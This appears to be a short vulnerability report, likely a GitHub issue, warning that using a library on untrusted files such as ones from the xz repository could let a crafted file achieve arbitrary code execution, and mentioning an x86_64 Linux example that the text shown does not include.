If the library is used to test untrusted input (for example, a file you found in [tukaani-project/xz](https://github.com/tukaani-project/xz)) a devious individual would be able to construct a malicious file to achieve arbitrary code execution on anyone running the tests.\r\n\r\nI have included an example of how it might look on x86_64 Linux.
